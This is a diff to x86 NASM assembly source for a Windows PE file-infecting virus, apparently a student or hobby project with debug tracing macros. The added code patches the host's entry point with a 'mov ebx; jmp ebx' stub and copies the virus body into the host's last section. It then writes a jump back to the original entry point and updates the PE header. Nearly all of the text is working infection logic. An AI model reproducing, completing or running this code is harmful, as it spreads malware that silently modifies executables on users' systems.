@@ -1,17 +1,28 @@
 %include "io.inc"
 
 
-%define DEBUG           1
+%define DEBUG           0
+
+%macro PRINT_VALUE 2
+    %if DEBUG
+        pushad
+        PRINT_STRING %1
+        PRINT_STRING ' = '
+        PRINT_HEX 4, %2
+        NEWLINE
+        popad
+    %endif
+%endmacro
 
 %macro PRINT_FILE 0 
-    pushad
-    mov dword[counter], 1
     %if DEBUG
+        pushad
+        mov dword[counter], 1
         NEWLINE
+        PRINT_STRING [search + 44]
+        NEWLINE
+        popad
     %endif
-    PRINT_STRING [search + 44]
-    NEWLINE
-    popad
 %endmacro
 
 %macro PRINT_TRACE 0 
@@ -76,8 +87,11 @@ section .data
     imageBase           dd 0
     oldRawSize          dd 0
     newRawSize          dd 0
-    incRawSize          dd 0
+    incRawSize          dd 0 
     codeSegment         dd 0
+    diskEP              dd 0
+    virusAddress        dd 0
+    virusLocation       dd 0
     
    
 section .text
@@ -346,17 +360,6 @@ OkGo:
     mov     [codeSegment], ebx
     PRINT_TRACE ;4
     
-    PRINT_HEX [PEHeader]
-    
-    
-    mov     eax, [codeSegment + 12]     ; Reading code segment's RVA
-    PRINT_TRACE;5
-    mov     eax, [codeSegment + 8]      ; Add the size of the segment
-    PRINT_TRACE;6
-    mov     [newEntryPoint], eax			; EAX = new EIP, and save it
-    PRINT_TRACE;7
-
-    
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Locate the last section in the PE                 ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -372,7 +375,30 @@ OkGo:
     add	  esi, 78h
     add	  esi, ebx
     add	  esi, eax						; ESI = Pointer to the last section header
- 
+    
+    PRINT_TRACE ;5
+    
+    mov     ebx, [codeSegment]     ; pointer to raw data of code segment
+    mov     eax, [ebx + 20]
+    mov     ebx, [codeSegment]      ; virtual size of code segment
+    add     eax, [ebx + 8]
+    mov     [diskEP], eax               ; where exectuable code is (entryPoint will jump here)
+    
+    PRINT_TRACE ;6
+    
+    mov     eax, [imageBase]            
+    add     eax, [esi + 12]
+    add     eax, [esi + 8]
+    mov     [virusAddress], eax
+    
+    PRINT_TRACE ;7
+    
+    mov     eax, [esi + 20]
+    add     eax, [esi + 8]
+    mov     [virusLocation], eax
+    
+    PRINT_TRACE ;8
+        
     pop	  ebx                         ; restore old peheader into ebx
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -411,7 +437,7 @@ OkGo:
     mov     ecx, [fileAlign]				; ECX = File alignment
     sub     ecx, edx						; Number of bytes to pad
     mov     [esi + 10h], ecx				; Save it
-    PRINT_TRACE ;5
+    PRINT_TRACE ;9
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now size of raw data = number of bytes to pad     ;;
@@ -434,17 +460,14 @@ OkGo:
 ;; VirtualAddress + VirtualSize - VirusLength        ;;
 ;;      + RawSize = VirusStart                       ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
+    mov eax, [codeSegment]
+    mov     ebx, [codeSegment]
+    mov     eax, [ebx + 12]     ; Reading code segment's RVA
+    PRINT_TRACE;10
+    add     eax, [ebx + 8]      ; Add the size of the segment
+    PRINT_TRACE;11
+    mov     [newEntryPoint], eax			; EAX = new EIP, and save it
+    PRINT_TRACE;12
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Here we compute with how much did we increase     ;;
@@ -454,7 +477,7 @@ OkGo:
     mov     ebx, [newRawSize]				; New SizeOfRawdata
     sub     ebx, eax						; Increase in size
     mov     [incRawSize], ebx				; Save increase value
-    PRINT_TRACE
+    PRINT_TRACE ;13
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Compute the new file size                         ;;
@@ -467,16 +490,43 @@ OkGo:
 ;; Now prepare to copy the virus to the host, The    ;;
 ;; formulas are                                      ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    mov     eax, [esi + 14h]            ; File offset of section raw data
-    add     eax, [esi + 16] 				; Add rawsize of section
-    sub     eax, virusLen					; Subtract the virus size from it
-    add     eax, [mapAddress]				; Align in memory to map address
+    ;mov     eax, [esi + 14h]            ; File offset of section raw data
+    ;add     eax, [esi + 16] 				; Add rawsize of section
+    ;sub     eax, virusLen					; Subtract the virus size from it
+    ;add     eax, [mapAddress]				; Align in memory to map address
+    
+    mov     eax, [diskEP]				; Align in memory to map address
+    add     eax, [mapAddress]
+    mov     [eax], byte 0xBB
+    mov     ebx, [virusAddress]
+    mov     [eax + 1], ebx
+    mov     [eax + 5], byte 0xFF
+    mov     [eax + 6], byte 0xE3
+    PRINT_TRACE ;14
 
-    mov     edi, eax						; Location to copy the virus to
+    mov     edi, [virusLocation]			; Location to copy the virus to
+    add     edi, [mapAddress]
     lea     esi, [start]                ; Location to copy the virus from
     mov     ecx, virusLen					; Number of bytes to copy
     rep     movsb							; Copy all the bytes
-    PRINT_TRACE
+    PRINT_TRACE ;15
+    
+    mov     eax, virusLen
+    PRINT_VALUE "virusLen", eax
+    add     eax, [virusLocation]
+    PRINT_VALUE "virusLen", eax
+    add     eax, [mapAddress]
+    PRINT_VALUE "virusLen", eax
+    
+    PRINT_TRACE ;16
+    
+    mov     ebx, [imageBase]
+    add     ebx, [oldEntryPoint]
+    mov     [eax], byte 0xBB
+    mov     [eax + 1], dword ebx
+    mov     [eax + 5], byte 0xFF
+    mov     [eax + 6], byte 0xE3
+    PRINT_TRACE ;17
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now, lets alter furthur the PE header by marking  ;;
@@ -484,16 +534,20 @@ OkGo:
 ;; files image with the increasing of the last       ;;
 ;; section                                           ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    mov     esi, [PEHeader]             ; ESI = Address of PE header
+    PRINT_TRACE ;18
+    mov     esi, [PEHeader]                  ; ESI = Address of PE header
     mov     eax, [newEntryPoint]			; Get value of new EIP in EAX
+    PRINT_TRACE ;19
     mov     [esi + 28h], eax				; Write it to the PE header
+    
+    PRINT_TRACE ;20
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now, lets mark the file as infected               ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     mov     esi, [mapAddress]
     ;mov     word [esi + 38h], 0x4144 ;'AD'  ; Mark file as infected
-    PRINT_TRACE
+    PRINT_TRACE ;16
  
 UnmapView:
     mov	  ebx, [mapAddress]
